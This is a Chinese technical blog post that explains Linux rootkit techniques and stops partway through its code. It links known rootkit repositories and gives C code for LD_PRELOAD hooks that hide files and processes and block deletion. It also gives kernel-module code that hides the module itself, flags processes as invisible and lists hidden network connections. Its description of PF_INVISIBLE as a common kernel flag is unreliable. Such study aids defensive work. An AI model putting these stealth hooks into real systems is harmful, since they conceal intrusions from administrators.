<!DOCTYPE html>
<html lang="zh">

<head>
  <!-- Required meta tags always come first -->
  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <meta name="google-site-verification" content="GgupatpoZgdqsBlxEZoMqGAy3aXAFtXIrYged3SB6EA" />
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <title>Linux环境下的Rootkit技术细节 | nJcx's Blog
</title>
  <link rel="canonical" href="https://www.njcx.bid/posts/O4.html">


  <link rel="apple-touch-icon" href="https://www.njcx.bid/apple-touch-icon.png" sizes="180x180">
  <link rel="icon" type="image/png" href="https://www.njcx.bid/favicon-32x32.png" sizes="32x32">
  <link rel="icon" type="image/png" href="https://www.njcx.bid/favicon-16x16.png" sizes="16x16">
  <link rel="manifest" href="https://www.njcx.bid/manifest.json">
  <meta name="theme-color" content="#333333">

  <link rel="stylesheet" href="https://www.njcx.bid/theme/css/bootstrap.min.css">
  <link rel="stylesheet" href="https://www.njcx.bid/theme/css/font-awesome.min.css">
  <link rel="stylesheet" href="https://www.njcx.bid/theme/css/pygments/emacs.min.css">
  <link rel="stylesheet" href="https://www.njcx.bid/theme/css/style.css">


<meta name="description" content="Linux环境下的Rootkit技术细节~">
<script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?a34c7a96ae9745547c373575407c521f";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>

<script>
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>

</head>

<body>
  <header class="header">
    <div class="container">
      <div class="row">
        <div class="col-sm-4">
          <a href="https://www.njcx.bid">
            <img class="img-fluid" src=https://www.njcx.bid/images/profile.png width=200 height=200 alt="nJcx's Blog">
          </a>
        </div>
        <div class="col-sm-8">
          <h1 class="title">&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<a href="https://www.njcx.bid">nJcx's Blog</a></h1>
          <p class="text-muted">十年生死两茫茫，写程序，到天亮。相顾无言，惟有泪千行</p>
          <ul class="list-inline">
                    <li class="list-inline-item">&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<a href="https://www.zhihu.com/people/njcxs" target="_blank">知乎</a></li>
                <li class="list-inline-item"><a href="https://www.anquanke.com/member/154147" target="_blank">安全客</a></li>
                <li class="list-inline-item"><a href="https://www.freebuf.com/column/1481" target="_blank">Freebuf</a></li>
            <li class=" list-inline-item text-muted">|</li>
            <li class="list-inline-item"><a class="fa fa-github" href="https://github.com/njcx" target="_blank"></a></li>
          </ul>
        </div>
      </div>
    </div>
  </header>

  <div class="main">
    <div class="container">
      <h1>Linux环境下的Rootkit技术细节
</h1>
      <hr>
<article class="article">
  <header>
    <ul class="list-inline">
      <li class="list-inline-item text-muted" title="2022-09-20T20:20:00+03:00">
        <i class="fa fa-clock-o"></i>
        二 20 九月 2022
      </li>
      <li class="list-inline-item">
        <i class="fa fa-folder-open-o"></i>
        <a href="https://www.njcx.bid/category/an-quan.html">安全</a>
      </li>
      <li class="list-inline-item">
        <i class="fa fa-user-o"></i>
        <a href="https://www.njcx.bid/author/njcx.html">nJcx</a>      </li>
      <li class="list-inline-item">
        <i class="fa fa-files-o"></i>
        <a href="https://www.njcx.bid/tag/linux.html">#Linux</a>      </li>
    </ul>
  </header>
  <div class="content">
    <h4>安装</h4>
<div class="highlight"><pre><span></span><code>https://github.com/f0rb1dd3n/Reptile.git
https://github.com/yaoyumeng/adore-ng.git
https://github.com/citypw/suterusu.git
https://github.com/m0nad/Diamorphine.git
https://github.com/hanj4096/wukong.git
https://github.com/ldpreload/Medusa.git
https://github.com/mav8557/Father.git
https://github.com/imlk0/yark.git
https://github.com/veo/vbackdoor.git
</code></pre></div>
<p>linux rootkit 主要分为两种，一种是用户态的rootkit，一种是内核态的rootkit。rootkit的主要目的是为了隐蔽地获取对操作系统的控制权或访问权限，同时尽量避免被检测到。用户态的rootkit主要是动态链接库（LD_PRELOAD）注入，通过设置环境变量 LD_PRELOAD 来加载恶意的共享库。这种方法可以拦截并修改标准库函数的行为，例如文件操作、网络通信等，从而隐蔽地执行某些操作，还有替换相关系统命令完成(通过替换ps、top、ls、ss、netstat等系统工具)。内核态的rootkit主要是可装载内核模块（LKM）实现， 主要是修改操作系统的核心部分，修改内部的数据结构或者进行系统函数HOOK，以此来隐藏其存在，例如隐藏特定的文件、进程和网络连接等。</p>
<p>无论是用户态rootkit还是内核的rootkit，都会把隐藏自己，作为核心功能存在， 都会有下面4个核心功能点，只是实现的方法，各有不同。</p>
<ul>
<li>
<p>隐藏文件</p>
</li>
<li>
<p>隐藏进程</p>
</li>
<li>
<p>隐藏网络连接状态</p>
</li>
<li>
<p>隐藏rootkit模块本身。</p>
</li>
</ul>
<h4>用户态动态链接库（LD_PRELOAD）注入</h4>
<p>LD_PRELOAD 是 Linux 环境下的一个环境变量，它允许用户指定在程序运行前优先加载的动态链接库（shared object）。通过这种方式，可以实现函数劫持（hook），即替换或增强某些函数的功能。这在调试、性能分析以及安全领域非常有用。当你设置 LD_PRELOAD 并运行一个程序时，Linux 动态链接器会首先加载由 LD_PRELOAD 指定的共享库中的符号（functions, variables等），然后才去加载其他依赖的库。这意味着你可以定义与标准库中同名的函数，在你的共享库中实现自定义逻辑，并在调用原版函数之前或之后执行额外的操作，或者完全替代它们。</p>
<p>实现方法：</p>
<ul>
<li>编写共享库：首先，你需要编写一个共享库，其中包含你想要hook的函数的实现。</li>
<li>编译共享库：使用 -fPIC 和 -shared 标志来编译你的代码，生成一个共享对象文件（.so）。</li>
<li>设置 LD_PRELOAD：在运行目标程序之前，通过设置 LD_PRELOAD 环境变量指向你的共享库，如 export LD_PRELOAD=/path/to/your/library.so。</li>
</ul>
<p>运行程序：当程序运行时，动态链接器将首先加载你指定的库，从而覆盖或添加原有函数的行为。</p>
<p>一个简单的例子来展示如何使用 LD_PRELOAD 来 hook 标准库中的 puts 函数。这个例子将拦截对 puts 的调用，并在实际调用之前打印一条自定义消息。</p>
<div class="highlight"><pre><span></span><code><span class="c1">#define _GNU_SOURCE</span>
<span class="c1">#include &lt;dlfcn.h&gt;</span>
<span class="c1">#include &lt;stdio.h&gt;</span>

//<span class="w"> </span>原始的<span class="w"> </span>puts<span class="w"> </span>函数指针
static<span class="w"> </span>int<span class="w"> </span><span class="o">(</span>*original_puts<span class="o">)(</span>const<span class="w"> </span>char*<span class="o">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>NULL<span class="p">;</span>

int<span class="w"> </span>puts<span class="o">(</span>const<span class="w"> </span>char<span class="w"> </span>*s<span class="o">)</span><span class="w"> </span><span class="o">{</span>
<span class="w">    </span>//<span class="w"> </span>如果这是第一次调用，则获取原始的<span class="w"> </span>puts<span class="w"> </span>函数地址
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">(</span>!original_puts<span class="o">)</span><span class="w"> </span><span class="o">{</span>
<span class="w">        </span><span class="nv">original_puts</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>dlsym<span class="o">(</span>RTLD_NEXT,<span class="w"> </span><span class="s2">"puts"</span><span class="o">)</span><span class="p">;</span>
<span class="w">    </span><span class="o">}</span>

<span class="w">    </span>printf<span class="o">(</span><span class="s2">"Intercepted call to puts with argument: %s\n"</span>,<span class="w"> </span>s<span class="o">)</span><span class="p">;</span>

<span class="w">    </span>//<span class="w"> </span>调用原始的<span class="w"> </span>puts<span class="w"> </span>函数
<span class="w">    </span><span class="k">return</span><span class="w"> </span>original_puts<span class="o">(</span>s<span class="o">)</span><span class="p">;</span>
<span class="o">}</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code>gcc<span class="w"> </span>-shared<span class="w"> </span>-fPIC<span class="w"> </span>-o<span class="w"> </span>demo.so<span class="w"> </span>demo.c<span class="w"> </span>-ldl

-shared<span class="w"> </span>表示生成共享库。
-fPIC<span class="w"> </span>生成与位置无关的代码，这对于共享库是必需的。
-ldl<span class="w"> </span>链接<span class="w"> </span>libdl<span class="w"> </span>库，用于动态加载符号。
</code></pre></div>
<p>测试程序 test_program.c 如下：</p>
<div class="highlight"><pre><span></span><code><span class="c1">#include &lt;stdio.h&gt;</span>

int<span class="w"> </span>main<span class="o">()</span><span class="w"> </span><span class="o">{</span>
<span class="w">    </span>puts<span class="o">(</span><span class="s2">"Hello, World!"</span><span class="o">)</span><span class="p">;</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="m">0</span><span class="p">;</span>
<span class="o">}</span>


gcc<span class="w"> </span>-o<span class="w"> </span>test_program<span class="w"> </span>test_program.c


<span class="nb">export</span><span class="w"> </span><span class="nv">LD_PRELOAD</span><span class="o">=</span><span class="nv">$PWD</span>/demo.so
./test_program
</code></pre></div>
<div class="highlight"><pre><span></span><code>Intercepted<span class="w"> </span>call<span class="w"> </span>to<span class="w"> </span>puts<span class="w"> </span>with<span class="w"> </span>argument:<span class="w"> </span>Hello,<span class="w"> </span>World!
Hello,<span class="w"> </span>World!
</code></pre></div>
<p>文件隐藏</p>
<div class="highlight"><pre><span></span><code>HOOK open、opendir、readdir等函数， 隐藏特定文件名
</code></pre></div>
<p>这段代码hook 了 readdir 函数，并在每次调用时检查当前目录项的名称。如果名称匹配要隐藏的文件（如 "xxx"），则跳过该目录项并继续读取下一个</p>
<div class="highlight"><pre><span></span><code>struct<span class="w"> </span>dirent<span class="w"> </span>*readdir<span class="o">(</span>DIR<span class="w"> </span>*dirp<span class="o">)</span><span class="w"> </span><span class="o">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">(</span>!original_readdir<span class="o">)</span><span class="w"> </span><span class="o">{</span>
<span class="w">        </span><span class="nv">original_readdir</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span>struct<span class="w"> </span>dirent*<span class="w"> </span><span class="o">(</span>*<span class="o">)(</span>DIR*<span class="o">))</span><span class="w"> </span>dlsym<span class="o">(</span>RTLD_NEXT,<span class="w"> </span><span class="s2">"readdir"</span><span class="o">)</span><span class="p">;</span>
<span class="w">    </span><span class="o">}</span>

<span class="w">    </span>const<span class="w"> </span>char<span class="w"> </span>*error_msg<span class="w"> </span><span class="o">=</span><span class="w"> </span>dlerror<span class="o">()</span><span class="p">;</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">(</span>error_msg<span class="w"> </span>!<span class="o">=</span><span class="w"> </span>NULL<span class="o">)</span><span class="w"> </span><span class="o">{</span>
<span class="w">        </span>fprintf<span class="o">(</span>stderr,<span class="w"> </span><span class="s2">"dlsym error: %s\n"</span>,<span class="w"> </span>error_msg<span class="o">)</span><span class="p">;</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span>NULL<span class="p">;</span>
<span class="w">    </span><span class="o">}</span>

<span class="w">    </span>struct<span class="w"> </span>dirent<span class="w"> </span>*entry<span class="p">;</span>
<span class="w">    </span><span class="k">while</span><span class="w"> </span><span class="o">((</span><span class="nv">entry</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>original_readdir<span class="o">(</span>dirp<span class="o">))</span><span class="w"> </span>!<span class="o">=</span><span class="w"> </span>NULL<span class="o">)</span><span class="w"> </span><span class="o">{</span>
<span class="w">        </span>//<span class="w"> </span>过滤掉你想要隐藏的文件或目录
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="o">(</span>strcmp<span class="o">(</span>entry-&gt;d_name,<span class="w"> </span><span class="s2">"xxx"</span><span class="o">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="m">0</span><span class="o">)</span><span class="w"> </span><span class="o">{</span>
<span class="w">            </span><span class="k">continue</span><span class="p">;</span><span class="w">  </span>//<span class="w"> </span>跳过这些文件
<span class="w">        </span><span class="o">}</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span>entry<span class="p">;</span>
<span class="w">    </span><span class="o">}</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span>NULL<span class="p">;</span>
<span class="o">}</span>
</code></pre></div>
<p>进程隐藏</p>
<div class="highlight"><pre><span></span><code>HOOK ps、top等命令相关的函数调用， 通常HOOK readdir函数来隐藏特定进程
</code></pre></div>
<p>这段代码是一个自定义的 readdir 函数，用于过滤特定进程的目录项。主要功能如下：</p>
<ul>
<li>初始化原始 readdir 函数指针。</li>
<li>进入循环读取目录项。</li>
<li>如果目录为 /proc 且进程名匹配，则跳过该目录项。</li>
<li>返回非过滤的目录项。</li>
</ul>
<div class="highlight"><pre><span></span><code>struct<span class="w"> </span>dirent*<span class="w"> </span>readdir<span class="o">(</span>DIR<span class="w"> </span>*dirp<span class="o">)</span><span class="w">                                       </span>
<span class="o">{</span><span class="w">                                                                       </span>
<span class="w">    </span><span class="k">if</span><span class="o">(</span>original_##readdir<span class="w"> </span><span class="o">==</span><span class="w"> </span>NULL<span class="o">)</span><span class="w"> </span><span class="o">{</span><span class="w">                                    </span>
<span class="w">        </span>original_##readdir<span class="w"> </span><span class="o">=</span><span class="w"> </span>dlsym<span class="o">(</span>RTLD_NEXT,<span class="w"> </span><span class="c1">#readdir);               </span>
<span class="w">        </span><span class="k">if</span><span class="o">(</span>original_##readdir<span class="w"> </span><span class="o">==</span><span class="w"> </span>NULL<span class="o">)</span><span class="w">                                  </span>
<span class="w">        </span><span class="o">{</span><span class="w">                                                              </span>
<span class="w">            </span>fprintf<span class="o">(</span>stderr,<span class="w"> </span><span class="s2">"Error in dlsym: %s\n"</span>,<span class="w"> </span>dlerror<span class="o">())</span><span class="p">;</span><span class="w">         </span>
<span class="w">        </span><span class="o">}</span><span class="w">                                                               </span>
<span class="w">    </span><span class="o">}</span><span class="w">                                                                   </span>

<span class="w">    </span>struct<span class="w"> </span>dirent*<span class="w"> </span>dir<span class="p">;</span><span class="w">                                                 </span>

<span class="w">    </span><span class="k">while</span><span class="o">(</span><span class="m">1</span><span class="o">)</span><span class="w">                                                            </span>
<span class="w">    </span><span class="o">{</span><span class="w">                                                                   </span>
<span class="w">        </span><span class="nv">dir</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>original_##readdir<span class="o">(</span>dirp<span class="o">)</span><span class="p">;</span><span class="w">                                 </span>
<span class="w">        </span><span class="k">if</span><span class="o">(</span>dir<span class="o">)</span><span class="w"> </span><span class="o">{</span><span class="w">                                                       </span>
<span class="w">            </span>char<span class="w"> </span>dir_name<span class="o">[</span><span class="m">256</span><span class="o">]</span><span class="p">;</span><span class="w">                                         </span>
<span class="w">            </span>char<span class="w"> </span>process_name<span class="o">[</span><span class="m">256</span><span class="o">]</span><span class="p">;</span><span class="w">                                     </span>
<span class="w">            </span><span class="k">if</span><span class="o">(</span>get_dir_name<span class="o">(</span>dirp,<span class="w"> </span>dir_name,<span class="w"> </span>sizeof<span class="o">(</span>dir_name<span class="o">))</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w">        </span>
<span class="w">                </span>strcmp<span class="o">(</span>dir_name,<span class="w"> </span><span class="s2">"/proc"</span><span class="o">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w">                       </span>
<span class="w">                </span>get_process_name<span class="o">(</span>dir-&gt;d_name,<span class="w"> </span>process_name<span class="o">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w">          </span>
<span class="w">                </span>strcmp<span class="o">(</span>process_name,<span class="w"> </span>process_to_filter<span class="o">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="m">0</span><span class="o">)</span><span class="w"> </span><span class="o">{</span><span class="w">         </span>
<span class="w">                </span><span class="k">continue</span><span class="p">;</span><span class="w">                                               </span>
<span class="w">            </span><span class="o">}</span><span class="w">                                                           </span>
<span class="w">        </span><span class="o">}</span><span class="w">                                                               </span>
<span class="w">        </span><span class="k">break</span><span class="p">;</span><span class="w">                                                          </span>
<span class="w">    </span><span class="o">}</span><span class="w">                                                                   </span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span>dir<span class="p">;</span><span class="w">                                                         </span>
<span class="o">}</span>
</code></pre></div>
<p>防止被删除
    HOOK rm 命令的相关函数调用，一般会HOOK unlink函数，来避免自己被删除</p>
<div class="highlight"><pre><span></span><code>int<span class="w"> </span>unlink<span class="w"> </span><span class="o">(</span>const<span class="w"> </span>char<span class="w"> </span>*pathname<span class="o">)</span>
<span class="o">{</span>
<span class="w">   </span><span class="nv">old_unlink</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>dlsym<span class="o">(</span>RTLD_NEXT,<span class="w"> </span><span class="s2">"unlink"</span><span class="o">)</span><span class="p">;</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="o">((</span>strstr<span class="w"> </span><span class="o">(</span>pathname,<span class="w"> </span>MAGIC_STRING<span class="o">))</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="o">(</span>strstr<span class="w"> </span><span class="o">(</span>pathname,<span class="w"> </span>CONFIG_FILE<span class="o">))</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="o">(</span>strstr<span class="w"> </span><span class="o">(</span>pathname,<span class="w"> </span>LIB_FILE<span class="o">)))</span><span class="w"> </span><span class="o">{</span>
<span class="w">    </span><span class="nv">errno</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>ENOENT<span class="p">;</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span>-1<span class="p">;</span>
<span class="w">  </span><span class="o">}</span>

<span class="w">  </span><span class="k">return</span><span class="w"> </span>old_unlink<span class="w"> </span><span class="o">(</span>pathname<span class="o">)</span><span class="p">;</span>
<span class="o">}</span>
</code></pre></div>
<h4>内核态可装载内核模块（LKM）</h4>
<p>内核态的rootkit主要是可装载内核模块（LKM）实现， 主要是修改操作系统的核心部分，修改内部的数据结构或者进行系统函数HOOK。那么我们就聚焦关注两个点：修改哪些数据结构， 怎么HOOK与HOOK哪些函数。首先，了解一下LKM 怎么编写。</p>
<h5>LKM 怎么编写</h5>
<div class="highlight"><pre><span></span><code>CentOS
<span class="c1">#  yum install -y kernel-devel-$(uname -r) kernel-headers-$(uname -r)  gcc gcc-c++ make</span>

Debian<span class="w"> </span>+<span class="w"> </span>Ubuntu
<span class="c1">#  apt install -y  gcc g++ make  linux-headers-$(uname -r)</span>
</code></pre></div>
<p>确保系统已经安装了内核头文件和编译工具。</p>
<p>下面是一个非常基础的内核模块示例代码（hello.c）：</p>
<div class="highlight"><pre><span></span><code><span class="c1">#include &lt;linux/init.h&gt;   // 包含宏定义 module_init 和 module_exit</span>
<span class="c1">#include &lt;linux/module.h&gt; // 包含核心模块函数和变量</span>

//<span class="w"> </span>模块加载时调用的函数
static<span class="w"> </span>int<span class="w"> </span>__init<span class="w"> </span>hello_start<span class="o">(</span>void<span class="o">)</span><span class="w"> </span><span class="o">{</span>
<span class="w">    </span>printk<span class="o">(</span>KERN_INFO<span class="w"> </span><span class="s2">"Hello world!\n"</span><span class="o">)</span><span class="p">;</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="m">0</span><span class="p">;</span><span class="w"> </span>//<span class="w"> </span>返回0表示成功加载
<span class="o">}</span>

//<span class="w"> </span>模块卸载时调用的函数
static<span class="w"> </span>void<span class="w"> </span>__exit<span class="w"> </span>hello_end<span class="o">(</span>void<span class="o">)</span><span class="w"> </span><span class="o">{</span>
<span class="w">    </span>printk<span class="o">(</span>KERN_INFO<span class="w"> </span><span class="s2">"Goodbye world!\n"</span><span class="o">)</span><span class="p">;</span>
<span class="o">}</span>

module_init<span class="o">(</span>hello_start<span class="o">)</span><span class="p">;</span><span class="w"> </span>//<span class="w"> </span>注册模块初始化函数
module_exit<span class="o">(</span>hello_end<span class="o">)</span><span class="p">;</span><span class="w">   </span>//<span class="w"> </span>注册模块退出函数

MODULE_LICENSE<span class="o">(</span><span class="s2">"GPL"</span><span class="o">)</span><span class="p">;</span><span class="w"> </span>//<span class="w"> </span>声明模块许可，避免警告
MODULE_AUTHOR<span class="o">(</span><span class="s2">"Your Name"</span><span class="o">)</span><span class="p">;</span><span class="w"> </span>//<span class="w"> </span>可选：作者信息
MODULE_DESCRIPTION<span class="o">(</span><span class="s2">"A simple Hello world LKM"</span><span class="o">)</span><span class="p">;</span><span class="w"> </span>//<span class="w"> </span>可选：模块描述
</code></pre></div>
<p>为了编译这个模块，需要一个Makefile：</p>
<div class="highlight"><pre><span></span><code>obj-m<span class="w"> </span>+<span class="o">=</span><span class="w"> </span>hello.o

all:
<span class="w">    </span>make<span class="w"> </span>-C<span class="w"> </span>/lib/modules/<span class="k">$(</span>shell<span class="w"> </span>uname<span class="w"> </span>-r<span class="k">)</span>/build<span class="w"> </span><span class="nv">M</span><span class="o">=</span><span class="k">$(</span>PWD<span class="k">)</span><span class="w"> </span>modules

clean:
<span class="w">    </span>make<span class="w"> </span>-C<span class="w"> </span>/lib/modules/<span class="k">$(</span>shell<span class="w"> </span>uname<span class="w"> </span>-r<span class="k">)</span>/build<span class="w"> </span><span class="nv">M</span><span class="o">=</span><span class="k">$(</span>PWD<span class="k">)</span><span class="w"> </span>clean
</code></pre></div>
<p>在包含源代码和Makefile的目录下运行make命令进行编译。如果一切正常，应该能看到生成的.ko文件。使用insmod hello.ko命令加载模块，并使用dmesg | tail查看日志输出确认模块是否正确加载。使用rmmod hello卸载模块，并再次检查日志以确认卸载消息。这只是一个入门级的例子。实际应用中，内核模块可能会更加复杂，包括错误处理、参数传递等。务必小心操作，因为错误的内核模块有可能导致系统不稳定或崩溃。</p>
<h5>修改哪些数据结构</h5>
<p>隐藏模块。具体功能如下：</p>
<ul>
<li>记录当前模块的链表前驱节点。</li>
<li>从模块链表中删除当前模块。</li>
<li>记录当前模块的kobject链表前驱节点。</li>
<li>删除模块的kobject。</li>
<li>从kobject链表中删除当前模块。</li>
</ul>
<div class="highlight"><pre><span></span><code>static<span class="w"> </span>struct<span class="w"> </span>list_head<span class="w"> </span>*module_previous<span class="p">;</span>
static<span class="w"> </span>struct<span class="w"> </span>list_head<span class="w"> </span>*module_kobj_previous<span class="p">;</span>
static<span class="w"> </span>char<span class="w"> </span><span class="nv">module_hidden</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">0</span><span class="p">;</span>


void<span class="w"> </span>module_hide<span class="o">(</span>void<span class="o">)</span>
<span class="o">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">(</span>module_hidden<span class="o">)</span><span class="w"> </span><span class="k">return</span><span class="p">;</span>
<span class="w">    </span><span class="nv">module_previous</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>THIS_MODULE-&gt;list.prev<span class="p">;</span>
<span class="w">    </span>list_del<span class="o">(</span><span class="p">&amp;</span>THIS_MODULE-&gt;list<span class="o">)</span><span class="p">;</span>
<span class="w">    </span><span class="nv">module_kobj_previous</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>THIS_MODULE-&gt;mkobj.kobj.entry.prev<span class="p">;</span>
<span class="w">    </span>kobject_del<span class="o">(</span><span class="p">&amp;</span>THIS_MODULE-&gt;mkobj.kobj<span class="o">)</span><span class="p">;</span>
<span class="w">    </span>list_del<span class="o">(</span><span class="p">&amp;</span>THIS_MODULE-&gt;mkobj.kobj.entry<span class="o">)</span><span class="p">;</span>
<span class="w">    </span><span class="nv">module_hidden</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>!module_hidden<span class="p">;</span>
<span class="o">}</span>
</code></pre></div>
<p>隐藏进程。设置或清除指定进程及其线程的标志位,具体功能如下</p>
<ul>
<li>锁定 RCU 读锁，查找并获取指定 PID 对应的任务结构。</li>
<li>如果找到任务结构，遍历该任务及其所有线程，根据参数 set 设置或清除标志位。</li>
</ul>
<p>在 Linux 中，task_struct-&gt;flags 常见的标志位包括：PF_INVISIBLE：标记进程为“不可见”，通常用于隐藏进程。
PF_EXITING：表示进程正在退出。PF_FORKNOEXEC：表示进程已 fork 但尚未 exec。</p>
<div class="highlight"><pre><span></span><code><span class="c1">#define FLAG 0x80000000</span>

struct<span class="w"> </span>tgid_iter<span class="w"> </span><span class="o">{</span>
<span class="w">    </span>unsigned<span class="w"> </span>int<span class="w"> </span>tgid<span class="p">;</span>
<span class="w">    </span>struct<span class="w"> </span>task_struct<span class="w"> </span>*task<span class="p">;</span>
<span class="o">}</span><span class="p">;</span>


static<span class="w"> </span>inline<span class="w"> </span>int<span class="w"> </span>is_task_invisible<span class="o">(</span>struct<span class="w"> </span>task_struct<span class="w"> </span>*task<span class="o">)</span>
<span class="o">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span>task-&gt;flags<span class="w"> </span><span class="p">&amp;</span><span class="w"> </span>FLAG<span class="p">;</span>
<span class="o">}</span>


int<span class="w"> </span>flag_tasks<span class="o">(</span>pid_t<span class="w"> </span>pid,<span class="w"> </span>int<span class="w"> </span><span class="nb">set</span><span class="o">)</span>
<span class="o">{</span>
<span class="w">    </span>int<span class="w"> </span><span class="nv">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">0</span><span class="p">;</span>
<span class="w">    </span>struct<span class="w"> </span>pid<span class="w"> </span>*p<span class="p">;</span>

<span class="w">    </span>rcu_read_lock<span class="o">()</span><span class="p">;</span>
<span class="w">    </span><span class="nv">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>find_get_pid<span class="o">(</span>pid<span class="o">)</span><span class="p">;</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">(</span>p<span class="o">)</span><span class="w"> </span><span class="o">{</span>
<span class="w">        </span>struct<span class="w"> </span>task_struct<span class="w"> </span>*task<span class="w"> </span><span class="o">=</span><span class="w"> </span>get_pid_task<span class="o">(</span>p,<span class="w"> </span>PIDTYPE_PID<span class="o">)</span><span class="p">;</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="o">(</span>task<span class="o">)</span><span class="w"> </span><span class="o">{</span>
<span class="c1">#if LINUX_VERSION_CODE &gt;= KERNEL_VERSION(3, 14, 0)</span>
<span class="w">            </span>struct<span class="w"> </span>task_struct<span class="w"> </span>*t<span class="w"> </span><span class="o">=</span><span class="w"> </span>NULL<span class="p">;</span>

<span class="w">            </span>for_each_thread<span class="o">(</span>task,<span class="w"> </span>t<span class="o">)</span>
<span class="w">            </span><span class="o">{</span>
<span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="o">(</span><span class="nb">set</span><span class="o">)</span>
<span class="w">                    </span>t-&gt;flags<span class="w"> </span><span class="p">|</span><span class="o">=</span><span class="w"> </span>FLAG<span class="p">;</span>
<span class="w">                </span><span class="k">else</span>
<span class="w">                    </span>t-&gt;flags<span class="w"> </span><span class="p">&amp;</span><span class="o">=</span><span class="w"> </span>~FLAG<span class="p">;</span>

<span class="w">                </span>ret++<span class="p">;</span>
<span class="w">            </span><span class="o">}</span>
<span class="c1">#endif</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="o">(</span><span class="nb">set</span><span class="o">)</span>
<span class="w">                </span>task-&gt;flags<span class="w"> </span><span class="p">|</span><span class="o">=</span><span class="w"> </span>FLAG<span class="p">;</span>
<span class="w">            </span><span class="k">else</span>
<span class="w">                </span>task-&gt;flags<span class="w"> </span><span class="p">&amp;</span><span class="o">=</span><span class="w"> </span>~FLAG<span class="p">;</span>

<span class="w">            </span>put_task_struct<span class="o">(</span>task<span class="o">)</span><span class="p">;</span>
<span class="w">        </span><span class="o">}</span>
<span class="w">        </span>put_pid<span class="o">(</span>p<span class="o">)</span><span class="p">;</span>
<span class="w">    </span><span class="o">}</span>
<span class="w">    </span>rcu_read_unlock<span class="o">()</span><span class="p">;</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span>ret<span class="p">;</span>
<span class="o">}</span>
</code></pre></div>
<p>隐藏网络连接。具体功能如下：</p>
<ul>
<li>分配内存创建一个隐藏连接结构体。</li>
<li>将传入的地址信息赋值给新创建的结构体。</li>
<li>将新创建的结构体添加到隐藏连接列表中。</li>
</ul>
<div class="highlight"><pre><span></span><code>struct<span class="w"> </span>hidden_conn<span class="w"> </span><span class="o">{</span>
<span class="w">    </span>struct<span class="w"> </span>sockaddr_in<span class="w"> </span>addr<span class="p">;</span>
<span class="w">    </span>struct<span class="w"> </span>list_head<span class="w"> </span>list<span class="p">;</span>
<span class="o">}</span><span class="p">;</span>

struct<span class="w"> </span>list_head<span class="w"> </span>hidden_conn_list<span class="p">;</span>

void<span class="w"> </span>network_hide_add<span class="o">(</span>struct<span class="w"> </span>sockaddr_in<span class="w"> </span>addr<span class="o">)</span>
<span class="o">{</span>
<span class="w">    </span>struct<span class="w"> </span>hidden_conn<span class="w"> </span>*hc<span class="p">;</span>

<span class="w">    </span><span class="nv">hc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>kmalloc<span class="o">(</span>sizeof<span class="o">(</span>*hc<span class="o">)</span>,<span class="w"> </span>GFP_KERNEL<span class="o">)</span><span class="p">;</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">(</span>!hc<span class="o">)</span>
<span class="w">        </span><span class="k">return</span><span class="p">;</span>

<span class="w">    </span>hc-&gt;addr<span class="w"> </span><span class="o">=</span><span class="w"> </span>addr<span class="p">;</span>
